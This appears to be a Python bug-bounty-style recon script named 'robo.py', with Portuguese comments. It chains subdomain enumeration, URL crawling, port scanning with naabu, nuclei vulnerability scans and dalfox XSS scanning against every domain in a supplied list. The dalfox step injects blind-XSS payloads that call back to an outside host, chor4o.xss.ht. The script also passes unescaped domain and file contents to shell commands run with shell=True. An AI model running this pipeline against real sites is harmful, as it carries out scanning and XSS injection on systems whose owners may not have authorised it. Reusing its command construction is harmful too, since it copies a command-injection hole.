import subprocess
import time
import base64
import sys
from pathlib import Path

def show_banner():
    b64 = """
IF8gX19fX19fICAgIF9fXyAgIF9fXyAgICBfX19fX19fICAgIF9fX19fXyAgICBf
X18gICBfX18gICBfX19fX19fICAgIApcfCAgXCAgX19fXFwgfFwgIFx8ICBcIHwg
fCBcXCAgXCAgX18gX18gXFwgfFwgIFwgXCAgfCBcXCB8XCAgXCAgX19fICAgICBc
cAogXCBcICBcICBfXyAgIFwgXCAgXCAgXFwgXFwgIFwgIFxfXCB8XFwgIFwgXFwg
XFwgXCBcIFwgXFxfX1wgXFwgIFwgIFwgXFxfXyAgIFwKIFwgIFwgICBcICAgICAg
XFwgXCAgXCAgXFwgICAgXCBcIF8gX18gXCBcIFxfX19fXyAgXFwgXCAgICAgXFwg
XFwgXFwgXCAgIAogIFwgIFwgX19fXCAgXFwgIFwgXFwgIFwgXFxfXCAgIFwgXFwg
IFxfXCAgIFwgXFwgICBcIHwgXFwgXFwgXCBcCiAgIFwgXFxfX19fX19fXFwgXFwg
X18gXFwgX19fX19cIFwgXFxfX19fXCBcIFxfXCBcIFwgXFxfX19cIFwgXFxfX19f
XAoK
"""
    print(base64.b64decode(b64).decode())

def run_cmd(cmd, output_file=None):
    """
    Executa um comando no shell.
    Se output_file for passado, salva a saída padrão no arquivo (append).
    Retorna a saída padrão como string.
    """
    try:
        if output_file:
            with open(output_file, "a", encoding="utf-8") as f:
                proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                f.write(proc.stdout)
                return proc.stdout
        else:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return proc.stdout
    except Exception as e:
        print(f"[!] Erro ao executar '{cmd}': {e}")
        return ""

def process_domain(domain):
    domain = domain.strip()
    if not domain:
        return

    print(f"\n[+] Iniciando recon para: {domain}")

    log_folder = Path("logs")
    log_folder.mkdir(exist_ok=True)
    
    # Arquivos base por domínio (para evitar misturar dados)
    domains_file = log_folder / f"{domain}_domains.txt"
    urls_file = log_folder / f"{domain}_urls.txt"
    alive_file = log_folder / f"{domain}_alive.txt"
    ports_file = log_folder / f"{domain}_ports.txt"
    crawled_urls_file = log_folder / f"{domain}_crawled_urls.txt"
    xss_candidates_file = log_folder / f"{domain}_xss_candidates.txt"
    dalfox_report = log_folder / f"{domain}_dalfox_report.txt"
    file_crawling_file = log_folder / f"{domain}_file_crawling.txt"
    slicepaths_file = log_folder / f"{domain}_slicepaths.txt"

    # Limpar arquivos antigos
    for f in [domains_file, urls_file, alive_file, ports_file, crawled_urls_file, xss_candidates_file, dalfox_report, file_crawling_file, slicepaths_file]:
        if f.exists():
            f.unlink()

    # 1. Chaos - coletar URLs
    print("[*] Executando chaos...")
    chaos_cmd = f"chaos -d {domain} -silent"
    chaos_output = run_cmd(chaos_cmd, domains_file)

    # 2. Subfinder nas URLs que chaos pegou (domínios)
    print("[*] Executando subfinder para pegar mais domínios...")
    if domains_file.exists():
        with open(domains_file, "r", encoding="utf-8") as f:
            for d in f:
                d = d.strip()
                if not d:
                    continue
                subfinder_cmd = f"echo {d} | subfinder -all -silent"
                run_cmd(subfinder_cmd, domains_file)
                time.sleep(1)

    # 3. Gau para pegar URLs (na lista de domínios)
    print("[*] Executando gau para pegar URLs...")
    gau_cmd = f"gau --input {domains_file} --threads 10 --o {urls_file}"
    run_cmd(gau_cmd)

    # 4. Katana para crawling URLs
    print("[*] Executando katana para crawling...")
    katana_cmd = f"katana -list {urls_file} -d 5 -silent"
    katana_output = run_cmd(katana_cmd, crawled_urls_file)

    # 5. SlicePathsURL para processar urls do gau e katana
    print("[*] Executando SlicePathsURL para processar URLs...")
    # Juntando urls gau + katana para processar no SlicePathsURL
    combined_urls_file = log_folder / f"{domain}_combined_urls.txt"
    with open(combined_urls_file, "w", encoding="utf-8") as outf:
        if urls_file.exists():
            outf.write(open(urls_file).read())
        if crawled_urls_file.exists():
            outf.write(open(crawled_urls_file).read())

    slicepaths_cmd = f"cat {combined_urls_file} | SlicePathsURL | anew {slicepaths_file}"
    run_cmd(slicepaths_cmd)

    # 6. Httpx para filtrar alive urls/domains
    print("[*] Executando httpx para alive check...")
    httpx_cmd = f"cat {domains_file} | httpx -silent"
    httpx_output = run_cmd(httpx_cmd, alive_file)

    # 7. Naabu para scan ports
    print("[*] Executando naabu para scan de portas...")
    naabu_cmd = f"cat {domains_file} | naabu -silent"
    naabu_output = run_cmd(naabu_cmd, ports_file)

    # 8. Httpx + nuclei nas portas
    print("[*] Executando nuclei nos hosts alive com portas...")
    if ports_file.exists():
        httpx_ports_cmd = f"cat {ports_file} | httpx -silent"
        hosts_alive_ports = run_cmd(httpx_ports_cmd)
        nuclei_cmd = f"echo '{hosts_alive_ports}' | nuclei -severity low,medium,high,critical"
        run_cmd(nuclei_cmd)

    # 9. XSS com gf + dalfox
    print("[*] Filtrando possíveis XSS e rodando dalfox...")
    if crawled_urls_file.exists():
        gf_xss_cmd = f"cat {crawled_urls_file} | gf xss | anew {xss_candidates_file}"
        run_cmd(gf_xss_cmd)
    if xss_candidates_file.exists():
        dalfox_cmd = (f"cat {xss_candidates_file} | dalfox pipe --skip-bav --mining-dom --deep-domxss "
                     f"--output-all --report --ignore-return -b 'https://chor4o.xss.ht/' --follow-redirects "
                     f"-o {dalfox_report}")
        run_cmd(dalfox_cmd)

    # 10. Katana crawling arquivos js, jsp, json
    print("[*] Katana crawling para arquivos .js .jsp .json...")
    katana_files_cmd = f"cat {alive_file} | katana -d 5 -silent -em js,jsp,json"
    run_cmd(katana_files_cmd, file_crawling_file)

    print(f"[+] Recon completo para {domain}. Logs em ./logs/\n")

def main(domains_file):
    show_banner()

    if not Path(domains_file).exists():
        print(f"[!] Arquivo {domains_file} não encontrado.")
        sys.exit(1)

    with open(domains_file, "r", encoding="utf-8") as f:
        domains = [line.strip() for line in f if line.strip()]

    for domain in domains:
        process_domain(domain)
        time.sleep(10)  # pausa entre domínios pra não sobrecarregar

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python robo.py lista_de_dominios.txt")
        sys.exit(1)

    domains_file = sys.argv[1]
    main(domains_file)
